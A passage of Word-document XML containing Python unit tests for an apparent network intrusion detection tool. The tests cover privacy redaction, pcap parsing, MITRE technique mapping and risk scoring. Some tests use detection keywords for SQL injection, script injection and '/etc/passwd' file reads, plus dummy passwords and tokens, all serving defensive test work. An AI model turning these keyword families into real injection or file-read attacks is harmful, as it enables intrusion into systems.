      </w:r>
    </w:p>
    <w:p w14:paraId="7CE265B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the replay harness: Z-Score baseline poisoning, KNN feature scaling and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1464EE0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K-Means novelty detection.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0C66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19C7DBB0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2343B1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math</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76EDF4D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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D666A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shutil</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="392D9F7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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264C51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tempfile</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58DCCCB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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29A57313" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B3C726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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68FD8C5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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FEDFC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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09DB587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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EDCB2A7" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="33BE951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utils.mitre as mitre</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3169BC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utils.pcap as pcap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="407799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utils.privacy as privacy</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4749AC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from engines import bloom, kmeans, knn, z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70744F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from utils.config import Config</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3928812A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61F004CB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4FF4C6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TestPrivacy(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C608B9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test_excerpt_truncated_to_64_bytes(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ED7156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NFR-3 states payload excerpts are truncated to 64 bytes</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5C5D6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long_payload = b"A" * 500</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E77AA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self.assertEqual(len(privacy.payload_excerpt(long_payload, limit=64)),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FDF92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64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EFA61B1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36827E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test_email_is_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4749F3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 = privacy.payload_excerpt(b"contact=alice@example.com", limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B22664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self.assertNotIn("alice@example.com", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71BBDB6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self.assertIn("EMAIL_REDACTED", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EDC3403" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70C4493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test_password_and_token_are_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353942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 = privacy.payload_excerpt(b"password=hunter2&amp;api_key=sk_live_99",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AEB27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limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="790161A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self.assertNotIn("hunter2", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450D6A7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self.assertNotIn("sk_live_99", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBB1740" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5A77C3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test_card_number_is_redacted(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FA40E2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 = privacy.payload_excerpt(b"card=4111111111111111", limit=200)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13BEAFD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self.assertNotIn("4111111111111111", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="156D09F3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13237B4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def test_control_bytes_cannot_reach_the_log(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="533C4D7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log-injection defence: escapes and newlines become '.'</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B75D5A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 = privacy.payload_excerpt(b"a\x1b[31mred\x00\nb", limit=64)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="029263A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self.assertNotIn("\x1b", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4506AEE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self.assertNotIn("\n", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C71941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self.assertNotIn("\x00", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4B069B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0549306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test_privacy_mode_off_keeps_content(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D23C2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 = privacy.payload_excerpt(b"password=hunter2", limit=64,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135982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privacy_mode=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BF4F64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self.assertIn("hunter2", out)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F993745" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="23EA29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test_ip_anonymisation_masks_host_octet(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6947391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self.assertEqual(privacy.anonymise_ip("192.168.1.57"), "192.168.1.0")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6611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disabled by default when the flag is off</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22BB50A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self.assertEqual(privacy.anonymise_ip("192.168.1.57", False),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0711934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"192.168.1.57")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="484C9DC8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E4DCC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test_non_ipv4_input_is_left_alone(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49BCC1E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self.assertEqual(privacy.anonymise_ip("not-an-ip"), "not-an-ip")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="696767CC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F05F5BF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62B164C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TestPcap(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A74B9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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0609A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self.tmp = tempfile.mkdtemp()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31AE54B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self.path = os.path.join(self.tmp, "t.pcap")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07F5D2AC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C9FB5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tearDown(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15F73F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shutil.rmtree(self.tmp, ignore_errors=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="494C8AA3" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="186F675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test_write_then_read_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04DBF2B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frames = [b"\xaa" * 60, b"\xbb" * 74, b"\xcc" * 128]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04FBDB6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pcap.PcapWriter(self.path) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D1C043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 f in enumerate(frames):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46DA5BA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w.write(f, ts=1700000000 + i)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FA7C1E" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4178670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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="431694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 = list(r)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="544500E1" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="763F919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self.assertEqual([d for _, d, _ in out], frames)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FC0AC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self.assertEqual([int(ts) for ts, _, _ in out],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA41E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[1700000000, 1700000001, 1700000002])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C28734F" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76DC682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test_global_header_is_libpcap_conformant(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009575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pcap.PcapWriter(self.path, snaplen=96) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00C27E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w.write(b"\x00" * 40)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4084079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open(self.path, "rb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24246B1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head = f.read(24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="242DD95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self.assertEqual(len(head), 24)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF7424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import struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61B6AB0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magic, major, minor, tz, sig, snap, link = struct.unpack("&lt;IHHiIII",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CC3AC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head)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30F8D6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self.assertEqual(magic, pcap.MAGIC_MICRO)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55390C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self.assertEqual((major, minor), (2, 4))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AF471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self.assertEqual(snap, 96)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4746F7C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self.assertEqual(link, pcap.LINKTYPE_ETHERNET)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089D4107" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="13D45CF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test_snaplen_truncates_but_records_original_length(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54FE7A9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 header-only capture must still report the true on-wire size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41B2DCE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pcap.PcapWriter(self.path, snaplen=32) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D1A48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w.write(b"\x11" * 1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56A06B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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63457BB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ts, data, orig = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA86D9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self.assertEqual(len(data), 32)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0780ACE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self.assertEqual(orig, 1514)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E7596D8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3028CB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test_microsecond_precision_preserved(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="281441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pcap.PcapWriter(self.path) as w:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C31D2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w.write(b"\x00" * 20, ts=1700000000.123456)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6D005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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06B1A40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ts, _, _ = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67EE656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self.assertAlmostEqual(ts, 1700000000.123456, places=5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FB4F77C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C872C7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test_rejects_non_pcap_file(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C076B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open(self.path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A98176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f.write(b"this is not a capture file at all")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17C60BE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self.assertRaises(pcap.PcapError):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23C470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pcap.PcapReader(self.path)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="421F52FA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46BF14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test_big_endian_capture_is_readable(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B88A16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captures written on a big-endian host must still parse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33A5295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import struct</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622EB8A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open(self.path, "wb") as f:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356FC42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f.write(struct.pack("&gt;IHHiIII", pcap.MAGIC_MICRO, 2, 4, 0, 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC4D6F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65535, 1))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6976E66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f.write(struct.pack("&gt;IIII", 1700000000, 500, 4, 4) + b"\xde\xad\xbe\xef")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11717A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pcap.PcapReader(self.path) as r:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="497250E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self.assertEqual(r.endian, "&gt;")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4195CB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ts, data, orig = next(iter(r))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A9FD4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self.assertEqual(data, b"\xde\xad\xbe\xef")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50AE3F65" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="47C2E407" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1AB2AE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TestMitre(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53D6481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test_each_detection_maps_to_expected_technique(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E98A56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cases = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="210EFE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("DDoS DETECTED! Z-Score: 4.2 (PPS: 9000)", "T1498"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575474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("PORT SCAN DETECTED! (Unique Ports: 90/sec)", "T1046"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DFE65C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("MALICIOUS PAYLOAD! Keywords: ['UNION', 'SELECT']", "T1190"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="039402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("BLACKLISTED IP DETECTED: 10.0.0.5 (Flagged)", "T1071"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6041F4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5D5A269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message, technique in cases:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6687EDF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self.assertEqual(mitre.enrich(message)["technique_id"], technique)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C1C90C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="304A857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test_payload_families_are_distinguished(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35EDD66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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0046260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"MALICIOUS PAYLOAD! Keywords: ['UNION']"), "sqli")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E2D85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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5363965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"MALICIOUS PAYLOAD! Keywords: ['SCRIPT', 'ALERT(']"), "xss")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8C3CC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self.assertEqual(mitre.classify_kind(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5503C9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"MALICIOUS PAYLOAD! Keywords: ['/ETC/PASSWD']"), "lfi")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D57EF5B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0186345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test_risk_score_is_bounded(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14922BD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kind in mitre.TECHNIQUES:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A7DEB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conf in (None, 0.0, 0.5, 1.0):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31173BF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score = mitre.risk_score(kind, conf)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6364B7C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self.assertGreaterEqual(score, 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29EBB5A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self.assertLessEqual(score, 10.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52A45F0B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06DF1C9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test_confidence_scales_risk_without_saturating(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385970E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low = mitre.risk_score("sqli", 0.1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A4E0F4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high = mitre.risk_score("sqli", 1.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAD3F8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self.assertLess(low, high)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="346B205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self.assertLessEqual(high, mitre.TECHNIQUES["sqli"]["base_score"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC4A504" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EFB442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test_severe_low_confidence_outranks_mild_high_confidence(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38723A6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self.assertGreater(mitre.risk_score("sqli", 0.1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113737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mitre.risk_score("anomaly", 1.0))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E6241F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6A88DD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test_payload_families_group_for_policy(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FA713C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kind in ("sqli", "xss", "lfi", "payload"):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67AE98A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self.assertEqual(mitre.parent_kind(kind), "payload")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3024077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self.assertEqual(mitre.parent_kind("ddos"), "ddos")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="713EC87A" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="109DDA4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test_unknown_message_is_not_fabricated(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12CB5CE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self.assertEqual(mitre.enrich("something unrelated")["technique_id"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB83A4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"N/A")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CA165C8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76CA59E8" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4BE8189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TestConfig(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2203FD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test_blocking_is_off_by_default(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E1B046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NFR-3: active defence must be opt-in</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D8542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self.assertFalse(Config().block_enabled)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5438B5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
